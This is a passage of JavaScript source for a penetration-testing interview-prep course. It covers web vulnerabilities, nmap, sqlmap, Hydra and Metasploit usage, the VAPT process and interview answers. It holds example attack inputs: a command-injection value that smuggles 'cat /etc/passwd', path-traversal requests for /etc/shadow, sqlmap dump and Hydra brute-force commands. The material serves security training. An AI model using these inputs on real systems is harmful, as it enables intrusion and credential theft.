    <p><strong>Severity:</strong> <span class="severity high">HIGH</span></p>
    <p>Application exposes internal object references (IDs, filenames) that users can manipulate to access unauthorized data.</p>

    ${caseStudy('IDOR — Viewing Other Users Documents', `
      <p><strong>Scenario:</strong> After login, your documents are at <code>/api/documents?user_id=1001</code></p>
      <p><strong>Attack:</strong> Change to <code>/api/documents?user_id=1002</code> — see another user's private documents!</p>
      <p><strong>Other IDOR examples:</strong></p>
      <ul>
        <li><code>/invoice/download?id=5001</code> → change to <code>id=5002</code></li>
        <li><code>/api/profile/123</code> → change to <code>/api/profile/124</code></li>
        <li><code>/receipt.pdf?order=ORD-001</code> → change to <code>ORD-002</code></li>
      </ul>
      <p><strong>Prevention:</strong></p>
      <ul>
        <li>Always verify the authenticated user owns the requested resource</li>
        <li>Use indirect references (map to internal IDs server-side)</li>
        <li>Use UUIDs instead of sequential integers</li>
        <li>Implement proper access control checks on every request</li>
      </ul>
    `)}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🖥️</span> Command Injection</h2>
    <p><strong>Severity:</strong> <span class="severity critical">CRITICAL</span></p>
    <p>Application passes user input to OS commands without sanitization.</p>

    ${terminal('Command Injection Example', `<span class="comment"># App has a ping feature:</span>
<span class="comment"># User enters: 8.8.8.8</span>
<span class="comment"># Server runs: ping -c 4 8.8.8.8</span>

<span class="comment"># Attack — user enters:</span>
<span class="warning">8.8.8.8; cat /etc/passwd</span>
<span class="comment"># Server runs: ping -c 4 8.8.8.8; cat /etc/passwd</span>
<span class="comment"># The semicolon chains commands — attacker reads password file!</span>

<span class="comment"># Other payloads:</span>
<span class="warning">8.8.8.8 && whoami</span>
<span class="warning">8.8.8.8 | ls -la</span>
<span class="warning">8.8.8.8 \`whoami\`</span>

<span class="comment"># Prevention: Never pass user input to system commands.</span>
<span class="comment"># If unavoidable, use allowlists and escape shell metacharacters.</span>`)}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">📂</span> Directory Traversal (Path Traversal)</h2>
    <p><strong>Severity:</strong> <span class="severity high">HIGH</span></p>
    <p>Access files outside the intended directory by manipulating file paths.</p>
    ${terminal('Path Traversal Example', `<span class="comment"># Application serves files:</span>
<span class="cmd">GET /download?file=report.pdf</span>

<span class="comment"># Attack — traverse to system files:</span>
<span class="warning">GET /download?file=../../../etc/passwd</span>
<span class="warning">GET /download?file=....//....//etc/shadow</span>
<span class="warning">GET /download?file=%2e%2e%2f%2e%2e%2fetc/passwd</span>  <span class="comment">(URL encoded)</span>

<span class="comment"># Prevention:</span>
<span class="comment"># - Validate/sanitize file names</span>
<span class="comment"># - Use a whitelist of allowed files</span>
<span class="comment"># - Resolve canonical path and verify it's within allowed directory</span>
<span class="comment"># - Don't expose file system paths in URLs</span>`)}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🔐</span> Brute Force & Credential Stuffing</h2>
    <p><strong>Severity:</strong> <span class="severity medium">MEDIUM-HIGH</span></p>
    <table class="comparison-table">
      <tr><th>Attack</th><th>How</th><th>What</th></tr>
      <tr><td><strong>Brute Force</strong></td><td>Try every possible password combination</td><td>Slow but guaranteed (eventually)</td></tr>
      <tr><td><strong>Dictionary Attack</strong></td><td>Try common passwords from a wordlist</td><td>Faster, uses known common passwords</td></tr>
      <tr><td><strong>Credential Stuffing</strong></td><td>Use leaked username/password pairs from other breaches</td><td>Works because people reuse passwords</td></tr>
    </table>
    <p><strong>Prevention:</strong> Rate limiting, CAPTCHA, account lockout, MFA, password complexity requirements.</p>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">👤</span> Session Hijacking & Fixation</h2>
    <table class="comparison-table">
      <tr><th>Attack</th><th>How</th></tr>
      <tr><td><strong>Session Hijacking</strong></td><td>Steal an active session token (via XSS, network sniffing, or MITM)</td></tr>
      <tr><td><strong>Session Fixation</strong></td><td>Force a known session ID onto a user before they log in</td></tr>
    </table>
    <p><strong>Prevention:</strong> Regenerate session ID after login, use HttpOnly + Secure flags, short session timeouts, bind session to IP/User-Agent.</p>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🕳️</span> Clickjacking</h2>
    <p>Attacker overlays a transparent iframe of target site over a malicious page, tricking users into clicking hidden buttons.</p>
    <p><strong>Prevention:</strong> <code>X-Frame-Options: DENY</code> or <code>SAMEORIGIN</code> header, <code>Content-Security-Policy: frame-ancestors 'none'</code></p>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🌊</span> DDoS (Distributed Denial of Service)</h2>
    <p>Flood a server with massive traffic from multiple sources to make it unavailable.</p>
    <table class="comparison-table">
      <tr><th>Layer</th><th>Type</th><th>Example</th></tr>
      <tr><td>Layer 3/4</td><td>Volumetric</td><td>SYN Flood, UDP Flood, ICMP Flood</td></tr>
      <tr><td>Layer 7</td><td>Application</td><td>HTTP Flood, Slowloris</td></tr>
    </table>
    <p><strong>Prevention:</strong> CDN/DDoS protection (Cloudflare, AWS Shield), rate limiting, traffic analysis, geo-blocking.</p>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">📧</span> Social Engineering & Phishing</h2>
    <ul>
      <li><strong>Phishing:</strong> Fake emails/websites to steal credentials</li>
      <li><strong>Spear Phishing:</strong> Targeted phishing at specific individuals</li>
      <li><strong>Whaling:</strong> Phishing targeting C-level executives</li>
      <li><strong>Vishing:</strong> Voice phishing (phone calls)</li>
      <li><strong>Smishing:</strong> SMS phishing</li>
      <li><strong>Pretexting:</strong> Creating a fabricated scenario to gain trust</li>
      <li><strong>Baiting:</strong> Leaving infected USB drives</li>
      <li><strong>Tailgating:</strong> Following authorized person into restricted area</li>
    </ul>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🧬</span> Man-in-the-Middle (MITM)</h2>
    <p>Attacker positions themselves between two communicating parties to intercept/modify traffic.</p>
    <div class="attack-flow">
      <div class="attack-step">Client</div>
      <div class="attack-arrow">→</div>
      <div class="attack-step" style="border-color:var(--accent-red)">Attacker<br>(intercepts)</div>
      <div class="attack-arrow">→</div>
      <div class="attack-step">Server</div>
    </div>
    <p><strong>Methods:</strong> ARP Spoofing, DNS Spoofing, Rogue WiFi, SSL Stripping</p>
    <p><strong>Prevention:</strong> HTTPS everywhere, HSTS header, certificate pinning, VPN on public WiFi.</p>
  </div>

  ${keyPoints([
    'SQL Injection: use parameterized queries — NEVER concatenate user input',
    'XSS: output encoding + CSP header + HttpOnly cookies',
    'CSRF: anti-CSRF tokens + SameSite cookies',
    'IDOR: always verify user owns the resource, use UUIDs',
    'Command Injection: never pass user input to OS commands',
    'For EVERY attack: know What → How → Harm → Prevention',
    'Brute Force: rate limit + CAPTCHA + account lockout + MFA'
  ])}

  ${moduleFooter('mod6', 'mod5', 'mod6b')}`;
}


// ============ MODULE 7: Security Tools ============
function renderModule7() {
  return `
  <div class="module-header fade-in">
    <div class="module-tag">Module 07 · 3 hrs</div>
    <h1>🔧 Security Tools</h1>
    <p class="module-desc">Hands-on knowledge of security tools is essential for VAPT. Burp Suite, NMAP, and Kali Linux are the core tools at Kratikal.</p>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🟠</span> Burp Suite</h2>
    <p>Burp Suite is the <strong>#1 tool for web application security testing</strong>. It acts as an intercepting proxy between your browser and the target application.</p>

    <h3>Key Components</h3>
    <table class="comparison-table">
      <tr><th>Tool</th><th>Purpose</th><th>When to Use</th></tr>
      <tr><td><strong>Proxy</strong></td><td>Intercept & modify HTTP requests/responses</td><td>Inspect traffic, modify parameters, test auth</td></tr>
      <tr><td><strong>Repeater</strong></td><td>Manually resend modified requests</td><td>Test SQLi, XSS payloads, API testing</td></tr>
      <tr><td><strong>Intruder</strong></td><td>Automated attacks with payloads (brute force, fuzzing)</td><td>Brute force login, parameter fuzzing</td></tr>
      <tr><td><strong>Scanner</strong></td><td>Automated vulnerability scanning (Pro only)</td><td>Quick automated scan</td></tr>
      <tr><td><strong>Decoder</strong></td><td>Encode/decode data (Base64, URL, HTML)</td><td>Decode tokens, encode payloads</td></tr>
      <tr><td><strong>Comparer</strong></td><td>Compare two requests/responses</td><td>Spot differences in responses</td></tr>
      <tr><td><strong>Sequencer</strong></td><td>Analyze randomness of tokens</td><td>Check session token entropy</td></tr>
    </table>

    <h3>How Burp Suite Works</h3>
    <div class="attack-flow">
      <div class="attack-step">Browser<br>(configured proxy)</div>
      <div class="attack-arrow">→</div>
      <div class="attack-step" style="border-color:var(--accent-orange)">Burp Suite<br>(intercepts)</div>
      <div class="attack-arrow">→</div>
      <div class="attack-step">Target<br>Server</div>
    </div>

    ${caseStudy('Using Burp to Test Login for SQLi', `
      <p><strong>Step 1:</strong> Configure browser proxy to 127.0.0.1:8080</p>
      <p><strong>Step 2:</strong> Turn on Intercept in Proxy tab</p>
      <p><strong>Step 3:</strong> Submit login form — Burp captures the request</p>
      <p><strong>Step 4:</strong> Send request to Repeater (Ctrl+R)</p>
      <p><strong>Step 5:</strong> Modify the username/password parameters with SQLi payloads</p>
      <p><strong>Step 6:</strong> Observe responses — different response length/status = vulnerability found!</p>
      <p><strong>Step 7:</strong> Use Intruder for automated testing with a payload list</p>
    `)}

    ${conceptCard('highlight', '💡 Interview Tip', '<p>When asked about Burp Suite, mention: "I use the Proxy to intercept requests, Repeater to manually test payloads like SQLi and XSS, and Intruder for automated attacks like brute-forcing login pages. I also check the Scanner results for automated vulnerability detection."</p>')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🔍</span> NMAP (Network Mapper)</h2>
    <p>NMAP is the most popular <strong>network scanning and reconnaissance tool</strong>. Used for discovering hosts, ports, services, and OS detection.</p>

    <h3>Essential NMAP Commands</h3>
    ${terminal('NMAP Scanning', `<span class="comment"># Basic scan (top 1000 ports)</span>
<span class="cmd">nmap 192.168.1.1</span>

<span class="comment"># Scan specific ports</span>
<span class="cmd">nmap -p 80,443,22 192.168.1.1</span>

<span class="comment"># Scan all 65535 ports</span>
<span class="cmd">nmap -p- 192.168.1.1</span>

<span class="comment"># Service version detection</span>
<span class="cmd">nmap -sV 192.168.1.1</span>

<span class="comment"># OS detection</span>
<span class="cmd">nmap -O 192.168.1.1</span>

<span class="comment"># Aggressive scan (OS + version + scripts + traceroute)</span>
<span class="cmd">nmap -A 192.168.1.1</span>

<span class="comment"># Stealth SYN scan (half-open, harder to detect)</span>
<span class="cmd">nmap -sS 192.168.1.1</span>

<span class="comment"># TCP connect scan</span>
<span class="cmd">nmap -sT 192.168.1.1</span>

<span class="comment"># UDP scan</span>
<span class="cmd">nmap -sU 192.168.1.1</span>

<span class="comment"># Ping sweep (discover live hosts on network)</span>
<span class="cmd">nmap -sn 192.168.1.0/24</span>

<span class="comment"># Vulnerability scanning with scripts</span>
<span class="cmd">nmap --script vuln 192.168.1.1</span>

<span class="comment"># Save output to file</span>
<span class="cmd">nmap -oN output.txt 192.168.1.1</span>
<span class="cmd">nmap -oX output.xml 192.168.1.1</span>`)}

    <h3>NMAP Scan Types Explained</h3>
    <table class="comparison-table">
      <tr><th>Flag</th><th>Scan Type</th><th>How It Works</th></tr>
      <tr><td><code>-sS</code></td><td>SYN Scan (Stealth)</td><td>Sends SYN, waits for SYN-ACK, sends RST (never completes handshake)</td></tr>
      <tr><td><code>-sT</code></td><td>TCP Connect</td><td>Full TCP handshake — more detectable but reliable</td></tr>
      <tr><td><code>-sU</code></td><td>UDP Scan</td><td>Sends UDP packets — slow but finds UDP services</td></tr>
      <tr><td><code>-sV</code></td><td>Version Detection</td><td>Probes open ports to determine service/version</td></tr>
      <tr><td><code>-sn</code></td><td>Ping Scan</td><td>Only discovers live hosts, no port scanning</td></tr>
      <tr><td><code>-sA</code></td><td>ACK Scan</td><td>Detects firewall rules (filtered vs unfiltered)</td></tr>
    </table>

    ${quiz('q_nmap', 'Which NMAP scan is considered "stealthy" because it never completes the TCP handshake?', ['TCP Connect (-sT)', 'SYN Scan (-sS)', 'UDP Scan (-sU)', 'Ping Scan (-sn)'], 1, 'SYN Scan (-sS) sends SYN, receives SYN-ACK, then sends RST instead of ACK. The connection is never fully established, making it harder for basic logging to detect.')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🐉</span> Kali Linux</h2>
    <p>Kali Linux is a Debian-based distribution designed for penetration testing and security auditing. It comes pre-installed with 600+ security tools.</p>

    <h3>Key Tools in Kali Linux</h3>
    <table class="comparison-table">
      <tr><th>Category</th><th>Tool</th><th>Purpose</th></tr>
      <tr><td>Recon</td><td><strong>NMAP, Recon-ng, theHarvester</strong></td><td>Network scanning, OSINT</td></tr>
      <tr><td>Web Testing</td><td><strong>Burp Suite, Nikto, dirb/gobuster</strong></td><td>Web vulnerability scanning</td></tr>
      <tr><td>Exploitation</td><td><strong>Metasploit, sqlmap</strong></td><td>Exploit vulnerabilities</td></tr>
      <tr><td>Password</td><td><strong>Hydra, John the Ripper, Hashcat</strong></td><td>Password cracking</td></tr>
      <tr><td>Wireless</td><td><strong>Aircrack-ng, Wifite</strong></td><td>WiFi security testing</td></tr>
      <tr><td>Sniffing</td><td><strong>Wireshark, tcpdump</strong></td><td>Packet capture & analysis</td></tr>
    </table>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🕷️</span> Other Important Tools</h2>

    <h3>sqlmap — Automated SQL Injection</h3>
    ${terminal('sqlmap Usage', `<span class="comment"># Test a URL for SQL injection</span>
<span class="cmd">sqlmap -u "http://target.com/page?id=1" --dbs</span>

<span class="comment"># Get tables from a database</span>
<span class="cmd">sqlmap -u "http://target.com/page?id=1" -D database_name --tables</span>

<span class="comment"># Dump data from a table</span>
<span class="cmd">sqlmap -u "http://target.com/page?id=1" -D db -T users --dump</span>

<span class="comment"># Test POST request</span>
<span class="cmd">sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs</span>`)}

    <h3>Nikto — Web Server Scanner</h3>
    ${terminal('Nikto Usage', `<span class="comment"># Scan a web server for vulnerabilities</span>
<span class="cmd">nikto -h http://target.com</span>
<span class="comment"># Checks for: outdated software, dangerous files, misconfigurations</span>`)}

    <h3>dirb / gobuster — Directory Brute Forcing</h3>
    ${terminal('Directory Discovery', `<span class="comment"># Find hidden directories and files</span>
<span class="cmd">dirb http://target.com /usr/share/wordlists/dirb/common.txt</span>
<span class="cmd">gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt</span>
<span class="comment"># Discovers: /admin, /backup, /config, /uploads, etc.</span>`)}

    <h3>Wireshark — Packet Analysis</h3>
    <p>GUI tool for capturing and analyzing network packets. Useful for:</p>
    <ul>
      <li>Detecting unencrypted credentials (HTTP, FTP, Telnet)</li>
      <li>Analyzing network attacks (ARP spoofing, MITM)</li>
      <li>Inspecting protocol behavior</li>
      <li>Filter examples: <code>http</code>, <code>tcp.port == 80</code>, <code>ip.addr == 192.168.1.1</code></li>
    </ul>

    <h3>Hydra — Password Brute Forcing</h3>
    ${terminal('Hydra Usage', `<span class="comment"># Brute force SSH login</span>
<span class="cmd">hydra -l admin -P wordlist.txt ssh://192.168.1.1</span>

<span class="comment"># Brute force HTTP login form</span>
<span class="cmd">hydra -l admin -P wordlist.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"</span>`)}

    <h3>Metasploit — Exploitation Framework</h3>
    ${terminal('Metasploit Basics', `<span class="cmd">msfconsole</span>             <span class="comment"># Start Metasploit</span>
<span class="cmd">search exploit_name</span>   <span class="comment"># Search for exploits</span>
<span class="cmd">use exploit/path</span>      <span class="comment"># Select an exploit</span>
<span class="cmd">show options</span>          <span class="comment"># See required settings</span>
<span class="cmd">set RHOSTS target_ip</span>  <span class="comment"># Set target</span>
<span class="cmd">exploit</span>               <span class="comment"># Run the exploit</span>`)}
  </div>

  ${keyPoints([
    'Burp Suite: Proxy (intercept), Repeater (manual testing), Intruder (automated attacks)',
    'NMAP: -sS (stealth SYN), -sV (version), -O (OS), -A (aggressive), -p- (all ports)',
    'Kali Linux: Debian-based pentesting OS with 600+ pre-installed tools',
    'sqlmap: automated SQL injection testing and exploitation',
    'Nikto: web server vulnerability scanner',
    'dirb/gobuster: discover hidden directories and files',
    'Wireshark: packet capture and analysis',
    'Hydra: brute force passwords for SSH, HTTP, FTP, etc.'
  ])}

  ${practiceBox([
    { text: 'TryHackMe — Guided cybersecurity labs (beginner friendly)', url: 'https://tryhackme.com/' },
    { text: 'HackTheBox — Pentesting challenges', url: 'https://www.hackthebox.com/' },
    { text: 'PortSwigger Web Security Academy — Free Burp Suite labs', url: 'https://portswigger.net/web-security' },
    { text: 'DVWA — Damn Vulnerable Web Application (practice locally)', url: 'https://github.com/digininja/DVWA' }
  ])}

  ${moduleFooter('mod7', 'mod6b', 'mod8')}`;
}


// ============ MODULE 8: VAPT & Reporting ============
function renderModule8() {
  return `
  <div class="module-header fade-in">
    <div class="module-tag">Module 08 · 2 hrs</div>
    <h1>📝 VAPT Process & Reporting</h1>
    <p class="module-desc">VAPT is what Kratikal does daily. Understanding the methodology, phases, and how to write reports is crucial for this role.</p>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🔍</span> What is VAPT?</h2>
    <p><strong>VAPT = Vulnerability Assessment + Penetration Testing</strong></p>
    <table class="comparison-table">
      <tr><th>Aspect</th><th>Vulnerability Assessment (VA)</th><th>Penetration Testing (PT)</th></tr>
      <tr><td><strong>Goal</strong></td><td>Find and list all vulnerabilities</td><td>Actively exploit vulnerabilities</td></tr>
      <tr><td><strong>Approach</strong></td><td>Broad, automated scanning</td><td>Deep, manual exploitation</td></tr>
      <tr><td><strong>Depth</strong></td><td>Wide coverage, shallow depth</td><td>Focused, deep analysis</td></tr>
      <tr><td><strong>Tools</strong></td><td>Nessus, OpenVAS, Qualys</td><td>Burp Suite, Metasploit, manual</td></tr>
      <tr><td><strong>Output</strong></td><td>List of vulnerabilities with severity</td><td>Proof of exploitation, impact analysis</td></tr>
      <tr><td><strong>Risk</strong></td><td>Low risk (scanning only)</td><td>Higher risk (actual exploitation)</td></tr>
    </table>
    ${conceptCard('highlight', '💡 Interview Answer', '<p>"VAPT combines two approaches: VA identifies and catalogues vulnerabilities using automated tools, while PT goes further by actually trying to exploit those vulnerabilities to assess real-world impact. Together they provide a comprehensive security assessment."</p>')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">📋</span> Penetration Testing Methodology</h2>
    <p>The standard pentesting process follows these phases:</p>

    <div class="attack-flow">
      <div class="attack-step"><strong>1. Planning</strong><br>& Scoping</div>
      <div class="attack-arrow">→</div>
      <div class="attack-step"><strong>2. Recon</strong><br>& OSINT</div>
      <div class="attack-arrow">→</div>
      <div class="attack-step"><strong>3. Scanning</strong><br>& Enumeration</div>
      <div class="attack-arrow">→</div>
      <div class="attack-step"><strong>4. Exploitation</strong><br>& Attack</div>
      <div class="attack-arrow">→</div>
      <div class="attack-step"><strong>5. Reporting</strong><br>& Remediation</div>
    </div>

    <h3>Phase 1: Planning & Scoping</h3>
    <ul>
      <li>Define scope — what systems/applications to test</li>
      <li>Get written authorization (Rules of Engagement)</li>
      <li>Define testing type: Black Box, White Box, or Grey Box</li>
      <li>Agree on timeline, emergency contacts, out-of-scope items</li>
    </ul>

    <h3>Testing Types</h3>
    <table class="comparison-table">
      <tr><th>Type</th><th>Knowledge Given</th><th>Simulates</th></tr>
      <tr><td><strong>Black Box</strong></td><td>No information (external attacker view)</td><td>Real-world external attack</td></tr>
      <tr><td><strong>White Box</strong></td><td>Full access (source code, architecture, credentials)</td><td>Insider threat / code review</td></tr>
      <tr><td><strong>Grey Box</strong></td><td>Partial info (user credentials, some documentation)</td><td>Authenticated user / partner attack</td></tr>
    </table>

    <h3>Phase 2: Reconnaissance (Information Gathering)</h3>
    <table class="comparison-table">
      <tr><th>Type</th><th>Passive Recon</th><th>Active Recon</th></tr>
      <tr><td><strong>Method</strong></td><td>No direct contact with target</td><td>Directly interacting with target</td></tr>
      <tr><td><strong>Examples</strong></td><td>WHOIS, Google dorking, Shodan, LinkedIn, DNS records</td><td>NMAP scanning, banner grabbing, directory brute-forcing</td></tr>
      <tr><td><strong>Risk</strong></td><td>Undetectable</td><td>Can be detected by IDS/IPS</td></tr>
    </table>

    ${terminal('Recon Commands', `<span class="comment"># Passive Reconnaissance</span>
<span class="cmd">whois target.com</span>          <span class="comment"># Domain registration info</span>
<span class="cmd">dig target.com ANY</span>        <span class="comment"># DNS records</span>
<span class="cmd">nslookup target.com</span>       <span class="comment"># DNS lookup</span>
<span class="cmd">theHarvester -d target.com -b google</span>  <span class="comment"># Gather emails, subdomains</span>

<span class="comment"># Google Dorking (search hacking)</span>
<span class="string">site:target.com filetype:pdf</span>    <span class="comment"># Find PDFs on target</span>
<span class="string">site:target.com inurl:admin</span>     <span class="comment"># Find admin pages</span>
<span class="string">site:target.com intitle:"index of"</span>  <span class="comment"># Find directory listings</span>
<span class="string">"target.com" password filetype:txt</span>  <span class="comment"># Find exposed passwords</span>

<span class="comment"># Active Reconnaissance</span>
<span class="cmd">nmap -sV -O target.com</span>    <span class="comment"># Port scan + service versions + OS</span>
<span class="cmd">nikto -h target.com</span>       <span class="comment"># Web server scan</span>
<span class="cmd">gobuster dir -u http://target.com -w wordlist.txt</span>  <span class="comment"># Directory discovery</span>`)}

    <h3>Phase 3: Scanning & Enumeration</h3>
    <ul>
      <li>Port scanning with NMAP</li>
      <li>Service version detection</li>
      <li>Vulnerability scanning (Nessus, OpenVAS)</li>
      <li>Web application scanning (Burp Suite, Nikto)</li>
      <li>Directory and file enumeration</li>
    </ul>

    <h3>Phase 4: Exploitation</h3>
    <ul>
      <li>Attempt to exploit discovered vulnerabilities</li>
      <li>Test for OWASP Top 10 (SQLi, XSS, IDOR, etc.)</li>
      <li>Attempt privilege escalation</li>
      <li>Document every step with screenshots</li>
      <li>Be careful NOT to cause damage or data loss</li>
    </ul>

    <h3>Phase 5: Reporting & Remediation</h3>
    <p>The report is the <strong>final deliverable</strong> — it's what the client pays for.</p>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">📄</span> VAPT Report Structure</h2>
    <table class="comparison-table">
      <tr><th>Section</th><th>Content</th></tr>
      <tr><td><strong>Executive Summary</strong></td><td>Non-technical overview for management. Overall risk rating.</td></tr>
      <tr><td><strong>Scope & Methodology</strong></td><td>What was tested, how, what tools were used</td></tr>
      <tr><td><strong>Findings Summary</strong></td><td>Table of all vulnerabilities with severity ratings</td></tr>
      <tr><td><strong>Detailed Findings</strong></td><td>For each vulnerability: Description, Impact, Steps to Reproduce, Evidence (screenshots), Remediation</td></tr>
      <tr><td><strong>Remediation Recommendations</strong></td><td>Prioritized fixes for each vulnerability</td></tr>
      <tr><td><strong>Appendix</strong></td><td>Tool outputs, raw data, methodology details</td></tr>
    </table>

    <h3>Vulnerability Severity Rating (CVSS)</h3>
    <table class="comparison-table">
      <tr><th>Rating</th><th>CVSS Score</th><th>Example</th></tr>
      <tr><td><span class="severity critical">Critical</span></td><td>9.0 – 10.0</td><td>RCE, Auth bypass, SQLi with full DB access</td></tr>
      <tr><td><span class="severity high">High</span></td><td>7.0 – 8.9</td><td>Stored XSS, IDOR on sensitive data, SSRF</td></tr>
      <tr><td><span class="severity medium">Medium</span></td><td>4.0 – 6.9</td><td>CSRF, Reflected XSS, Information disclosure</td></tr>
      <tr><td><span class="severity low">Low</span></td><td>0.1 – 3.9</td><td>Missing headers, verbose errors, cookie flags</td></tr>
    </table>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">📜</span> Compliance Standards</h2>
    <table class="comparison-table">
      <tr><th>Standard</th><th>Focus</th><th>Industry</th></tr>
      <tr><td><strong>PCI DSS</strong></td><td>Payment card data security</td><td>E-commerce, BFSI</td></tr>
      <tr><td><strong>ISO 27001</strong></td><td>Information security management</td><td>Any industry</td></tr>
      <tr><td><strong>HIPAA</strong></td><td>Healthcare data protection</td><td>Healthcare</td></tr>
      <tr><td><strong>GDPR</strong></td><td>EU data privacy</td><td>Any company handling EU data</td></tr>
      <tr><td><strong>SOC 2</strong></td><td>Service organization controls</td><td>SaaS, cloud providers</td></tr>
    </table>
    <p>Kratikal serves BFSI, Fintech, E-commerce clients — <strong>PCI DSS and ISO 27001</strong> are most relevant.</p>
  </div>

  ${keyPoints([
    'VA = find vulnerabilities (broad); PT = exploit them (deep)',
    'Black Box = no info; White Box = full info; Grey Box = partial info',
    'Pentesting phases: Plan → Recon → Scan → Exploit → Report',
    'Report must include: Description, Impact, Steps to Reproduce, Evidence, Remediation',
    'CVSS scoring: Critical (9-10), High (7-8.9), Medium (4-6.9), Low (0.1-3.9)',
    'Know Google dorking: site:, filetype:, inurl:, intitle:',
    'Compliance: PCI DSS (payments), ISO 27001 (infosec), GDPR (privacy)'
  ])}

  ${moduleFooter('mod8', 'mod7', 'mod9')}`;
}


// ============ MODULE 9: Interview Q&A Bank ============
function renderModule9() {
  return `
  <div class="module-header fade-in">
    <div class="module-tag">Module 09 · 2 hrs</div>
    <h1>🎯 Interview Q&A Bank</h1>
    <p class="module-desc">100+ real interview questions with detailed answers covering all topics. Organized by category. Click each question to reveal the answer.</p>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🔐</span> Cybersecurity Basics</h2>
    ${qa(1, 'What is cybersecurity?', 'Cybersecurity is the practice of protecting systems, networks, data, and programs from digital attacks, unauthorized access, damage, or theft. It involves implementing technologies, processes, and controls to safeguard digital assets and ensure the confidentiality, integrity, and availability (CIA) of information.')}
    ${qa(2, 'Explain the CIA Triad.', '<strong>Confidentiality:</strong> Ensuring data is accessible only to authorized users (encryption, access controls).<br><strong>Integrity:</strong> Ensuring data is accurate and unmodified (hashing, digital signatures, checksums).<br><strong>Availability:</strong> Ensuring systems and data are accessible when needed (backups, redundancy, DDoS protection).<br>Every security measure maps to one or more of these three pillars.')}
    ${qa(3, 'What is the difference between Authentication and Authorization?', '<strong>Authentication (AuthN)</strong> verifies WHO you are — "Are you really Vaibhav?" Done via passwords, biometrics, OTP, certificates.<br><strong>Authorization (AuthZ)</strong> verifies WHAT you can do — "Does Vaibhav have admin access?" Done via roles, permissions, ACLs.<br>Authentication always comes FIRST. HTTP 401 = not authenticated. HTTP 403 = authenticated but not authorized.')}
    ${qa(4, 'What is the difference between a Vulnerability, Threat, Exploit, and Risk?', '<strong>Vulnerability:</strong> A weakness in a system (e.g., unpatched software, SQL injection flaw).<br><strong>Threat:</strong> A potential cause of harm (e.g., hacker, malware, insider).<br><strong>Exploit:</strong> Code or method that takes advantage of a vulnerability.<br><strong>Risk:</strong> The likelihood and impact of a threat exploiting a vulnerability.<br>Formula: <code>Risk = Threat × Vulnerability × Impact</code>')}
    ${qa(5, 'What is the difference between Hashing and Encryption?', '<strong>Hashing:</strong> One-way function, cannot be reversed. Fixed-length output. Used for integrity verification and password storage. Examples: MD5, SHA-256, bcrypt.<br><strong>Encryption:</strong> Two-way function, can be reversed with a key. Used for data confidentiality. Types: Symmetric (AES — same key) and Asymmetric (RSA — public/private key pair).')}
    ${qa(6, 'What is Multi-Factor Authentication (MFA)?', 'MFA requires two or more verification factors from different categories:<br>1. <strong>Something you know</strong> — password, PIN<br>2. <strong>Something you have</strong> — phone (OTP), hardware token, smart card<br>3. <strong>Something you are</strong> — fingerprint, face recognition, iris scan<br>Using two passwords is NOT MFA (both are "something you know"). True MFA uses factors from different categories.')}
    ${qa(7, 'What types of hackers exist?', '<strong>White Hat:</strong> Ethical hackers who test with permission to improve security.<br><strong>Black Hat:</strong> Malicious hackers who exploit systems illegally for personal gain.<br><strong>Grey Hat:</strong> Find vulnerabilities without permission but without malicious intent.<br><strong>Script Kiddie:</strong> Uses pre-made tools without deep understanding.<br><strong>Hacktivist:</strong> Hacks for political/social causes.<br><strong>State-Sponsored:</strong> Government-backed hackers (APT groups).')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🌐</span> Networking</h2>
    ${qa(8, 'Explain the OSI Model.', 'The OSI (Open Systems Interconnection) model has 7 layers (remember: "Please Do Not Throw Sausage Pizza Away"):<br>7. <strong>Application</strong> — HTTP, FTP, DNS (user-facing services)<br>6. <strong>Presentation</strong> — Encryption, compression (SSL/TLS)<br>5. <strong>Session</strong> — Manages sessions/connections<br>4. <strong>Transport</strong> — TCP/UDP (reliable vs fast delivery)<br>3. <strong>Network</strong> — IP routing (routers work here)<br>2. <strong>Data Link</strong> — MAC addresses (switches work here)<br>1. <strong>Physical</strong> — Cables, signals (hubs)')}
    ${qa(9, 'What is the difference between TCP and UDP?', '<strong>TCP (Transmission Control Protocol):</strong> Connection-oriented, reliable, ordered delivery, uses 3-way handshake (SYN → SYN-ACK → ACK). Used for HTTP, SSH, FTP, email.<br><strong>UDP (User Datagram Protocol):</strong> Connectionless, fast, no guarantee of delivery or order. Used for DNS, streaming, VoIP, gaming.')}
    ${qa(10, 'What is a 3-way handshake?', 'TCP connection establishment process:<br>1. <strong>SYN:</strong> Client sends SYN packet to server<br>2. <strong>SYN-ACK:</strong> Server responds with SYN-ACK<br>3. <strong>ACK:</strong> Client sends ACK — connection established<br><strong>SYN Flood Attack:</strong> Attacker sends many SYN packets but never sends ACK, exhausting server resources (DoS attack).')}
    ${qa(11, 'What is DNS and how does it work?', 'DNS (Domain Name System) translates human-readable domain names (google.com) to IP addresses (142.250.x.x). Process: Browser → DNS Resolver (ISP) → Root Server → TLD Server (.com) → Authoritative DNS → IP returned.<br><strong>Attacks:</strong> DNS Spoofing/Cache Poisoning (redirect to fake sites), DNS Tunneling (data exfiltration through DNS queries).')}
